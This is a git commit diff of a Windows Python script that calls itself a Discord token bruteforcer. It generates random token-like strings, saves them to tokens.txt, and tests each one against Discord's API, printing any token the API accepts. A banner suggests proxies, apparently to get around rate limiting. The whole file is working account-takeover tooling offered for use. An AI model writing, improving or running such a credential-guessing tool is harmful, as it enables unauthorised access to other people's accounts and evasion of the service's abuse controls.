4dd5ad0270f2b07b80fafd20677ea2fc71bd7303
a11y_spec <72933157+a11y-spec@users.noreply.github.com>
2021-09-15 09:43:03 +0530

    Update and rename trying.py to checker.py

--- checker.py
+++ checker.py
@@ -1,4 +1,5 @@
 import ctypes, os, threading, strgen, base64, requests
+
 class Discord:
     def __init__(self):
         self.regularExpression = ".([a-zA-Z0-9]{6})\.([a-zA-Z0-9]{27})" 
@@ -23,11 +24,11 @@ class Discord:
         else:
             open("./tokens.txt", "w").close() 
     def title(self):
-        ctypes.windll.kernel32.SetConsoleTitleW(f"?????: {self.generated}")
+        ctypes.windll.kernel32.SetConsoleTitleW(f"{self.generated}")
         
 os.system('cls')
-ctypes.windll.kernel32.SetConsoleTitleW(f"?????")
-print("A simple discord token-bruteforcer works in windows only \n I would prefer you to use proxies")
+ctypes.windll.kernel32.SetConsoleTitleW(f"")
+print("A simple discord token-bruteforcer works in windows only\n There are 0.01% it will found the correct Token all the best. \n I would prefer you to use proxies")
 open("./tokens.txt", "w").close()
 token = Discord()
 amountToGen = int(input("Enter amount of tokens to generate: "))
@@ -36,19 +37,20 @@ id = str(id)[2:-1]
 for _ in range(amountToGen):
     threading.Thread(target=token.generate).start()
     os.system('cls')
-    with open("tokens.txt") as f:
-        for line in f:
-            token = line.strip("\n")
-            headers = {'Content-Type': 'application/json', 'authorization': token}
-            url = "https://discordapp.com/api/v6/users/@me/library"
-            r = requests.get(url, headers=headers)
-            if r.status_code == 200:
-                print("{} worked.".format(line.strip("\n")))
-            elif r.status_code == 429:
-                print("You are being rate limited.")
-            elif r.status_code == 504:
-                print("Time Out!")
-            else:
-                print("Token Didn't Worked!")
-
+with open("tokens.txt") as f:
+    for line in f:
+        token = line.strip("\n")
+        headers = {'Content-Type': 'application/json', 'authorization': token}
+        url = "https://discordapp.com/api/v6/users/@me/library"
+        r = requests.get(url, headers=headers)
+        if r.status_code == 200:
+            print("{} worked.".format(line.strip("\n")))
+            os.system('pause')
+        elif r.status_code == 429:
+            print("You are being rate limited.")
+        elif r.status_code == 504:
+            print("Time Out!")
+        else:
+            print("Token Didn't Worked!")
+    os.system('pause')
 
